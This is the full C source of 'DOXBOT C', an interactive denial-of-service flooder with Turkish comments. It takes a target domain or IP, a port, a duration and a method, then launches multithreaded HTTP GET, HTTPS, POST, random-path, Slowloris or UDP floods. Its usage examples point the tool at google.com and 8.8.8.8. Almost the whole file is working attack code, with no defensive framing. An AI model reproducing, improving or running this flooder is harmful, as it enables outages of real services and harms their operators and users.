#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <netdb.h>

#define MAX_CMD 128
#define PAKET_BOYUT 1400
#define THREAD_SAY 50  // Daha düşük - kasmayı önler

int devam = 1;
char hedef_ip[16];
char hedef_domain[64];
int hedef_port;
int surec;
int islem_sayisi;
pthread_t *tidler = NULL;
int aktif = 0;
int https_flag = 0;

void prompt() {
    printf("\n");
    char *yazi = " root@doxbot ~> ";
    int renkler[] = {17,17,17,17,17,17,17,17,129,129,129,129,129,129,129};
    int len = sizeof(renkler)/sizeof(int);
    for (int i = 0; yazi[i] != '\0'; i++) {
        int r = renkler[i % len];
        printf("\033[48;5;%dm\033[38;5;15m%c", r, yazi[i]);
    }
    printf("\033[0m");
    fflush(stdout);
}

// DNS çözümleyici
void coz_domain(char *domain) {
    struct hostent *he = gethostbyname(domain);
    if (he) {
        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
        if (addr_list[0]) {
            strcpy(hedef_ip, inet_ntoa(*addr_list[0]));
            return;
        }
    }
    strcpy(hedef_ip, domain);
}

// ---------- HTTP GET FLOOD ----------
void *http_get_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        
        if (connect(soket, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char request[1024];
            snprintf(request, sizeof(request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                "Accept: text/html\r\n"
                "Connection: keep-alive\r\n\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip);
            send(soket, request, strlen(request), 0);
        }
        close(soket);
        usleep(100);
    }
    return NULL;
}

// ---------- HTTPS/TLS FLOOD ----------
void *https_get_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(443);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        
        if (connect(soket, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char request[1024];
            snprintf(request, sizeof(request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip);
            send(soket, request, strlen(request), 0);
        }
        close(soket);
        usleep(200);
    }
    return NULL;
}

// ---------- HTTP POST FLOOD ----------
void *http_post_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        
        if (connect(soket, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char post_data[512];
            memset(post_data, 'A', 512);
            char request[2048];
            snprintf(request, sizeof(request),
                "POST / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: %d\r\n"
                "Connection: close\r\n\r\n%s",
                hedef_domain[0] ? hedef_domain : hedef_ip, 512, post_data);
            send(soket, request, strlen(request), 0);
        }
        close(soket);
        usleep(150);
    }
    return NULL;
}

// ---------- RANDOM PATH FLOOD ----------
void *http_random_gonder(void *arg) {
    char yollar[][20] = {"/admin", "/login", "/api", "/test", "/images", "/css", "/js", "/upload"};
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        
        if (connect(soket, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char path[64];
            snprintf(path, sizeof(path), "%s?%d", yollar[rand() % 8], rand() % 9999);
            char request[1024];
            snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "Connection: close\r\n\r\n",
                path, hedef_domain[0] ? hedef_domain : hedef_ip);
            send(soket, request, strlen(request), 0);
        }
        close(soket);
        usleep(50);
    }
    return NULL;
}

// ---------- SLOWLORIS ----------
void *slowloris_gonder(void *arg) {
    while (devam) {
        int soket = socket(AF_INET, SOCK_STREAM, 0);
        if (soket < 0) continue;
        struct sockaddr_in dst;
        dst.sin_family = AF_INET;
        dst.sin_port = htons(hedef_port);
        inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
        
        if (connect(soket, (struct sockaddr *)&dst, sizeof(dst)) == 0) {
            char request[512];
            snprintf(request, sizeof(request),
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0\r\n"
                "X-Forwarded-For: 192.168.%d.%d\r\n",
                hedef_domain[0] ? hedef_domain : hedef_ip, rand()%255, rand()%255);
            send(soket, request, strlen(request), 0);
            // Bağlantıyı açık tut
            for (int i = 0; i < 10 && devam; i++) {
                send(soket, "X-Header: keep-alive\r\n", 22, 0);
                usleep(500000);
            }
        }
        close(soket);
    }
    return NULL;
}

// ---------- UDP ----------
void *udp_gonder(void *arg) {
    int soket = socket(AF_INET, SOCK_DGRAM, 0);
    if (soket < 0) return NULL;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(hedef_port);
    inet_pton(AF_INET, hedef_ip, &dst.sin_addr);
    unsigned char *veri = malloc(PAKET_BOYUT);
    for (int i = 0; i < PAKET_BOYUT; i++) veri[i] = rand() % 256;
    while (devam) {
        sendto(soket, veri, PAKET_BOYUT, 0, (struct sockaddr *)&dst, sizeof(dst));
    }
    free(veri);
    close(soket);
    return NULL;
}

void saldiri_baslat(char *domain, int port, int sure, char *metod) {
    strcpy(hedef_domain, domain);
    coz_domain(domain);
    hedef_port = port;
    surec = sure;
    devam = 1;
    https_flag = (port == 443);
    
    islem_sayisi = sysconf(_SC_NPROCESSORS_ONLN);
    int toplam = islem_sayisi * THREAD_SAY;

    void *(*fonk)(void *) = NULL;
    if (strcmp(metod, "http") == 0) fonk = http_get_gonder;
    else if (strcmp(metod, "https") == 0) fonk = https_get_gonder;
    else if (strcmp(metod, "post") == 0) fonk = http_post_gonder;
    else if (strcmp(metod, "random") == 0) fonk = http_random_gonder;
    else if (strcmp(metod, "slow") == 0) fonk = slowloris_gonder;
    else if (strcmp(metod, "udp") == 0) fonk = udp_gonder;
    else { printf("[-] Metod: http, https, post, random, slow, udp\n"); return; }

    printf("\n[ Attack Info ]\n");
    printf("  Status    Sent successfully!\n");
    printf("  Host      %s (%s)\n", domain, hedef_ip);
    printf("  Method    %s\n", metod);
    printf("  Port      %d\n", port);
    printf("  Time      %d\n\n", sure);

    printf("[ Target Info ]\n");
    printf("  Running   1/9999\n\n");
    printf("[+] Saldiri basladi. 'stop' ile durdur.\n");

    tidler = malloc(sizeof(pthread_t) * toplam);
    int idx = 0;
    for (int i = 0; i < islem_sayisi; i++) {
        for (int j = 0; j < THREAD_SAY; j++) {
            pthread_create(&tidler[idx++], NULL, fonk, NULL);
        }
    }
    aktif = toplam;

    time_t basla = time(NULL);
    char girdi[MAX_CMD];
    while (time(NULL) - basla < surec && devam) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "stop") == 0) { devam = 0; break; }
    }

    devam = 0;
    sleep(1);
    for (int i = 0; i < aktif; i++) pthread_join(tidler[i], NULL);
    free(tidler);
    printf("[+] Saldiri tamamlandi.\n");
}

int main() {
    printf("\n=== DOXBOT C ===\n");
    printf("Komut: <DOMAIN/IP> <PORT> <SANIYE> <METOD>\n");
    printf("Metodlar: http, https, post, random, slow, udp\n");
    printf("Ornek: google.com 80 60 http\n");
    printf("Ornek: 8.8.8.8 53 60 udp\n\n");

    char girdi[MAX_CMD];
    while (1) {
        prompt();
        if (fgets(girdi, sizeof(girdi), stdin) == NULL) break;
        girdi[strcspn(girdi, "\n")] = 0;
        if (strcmp(girdi, "exit") == 0) break;

        char domain[64], metod[20];
        int port, sure;
        if (sscanf(girdi, "%63s %d %d %19s", domain, &port, &sure, metod) == 4) {
            saldiri_baslat(domain, port, sure, metod);
        } else {
            printf("[-] Format: <DOMAIN/IP> <PORT> <SANIYE> <METOD>\n");
        }
    }
    return 0;
}
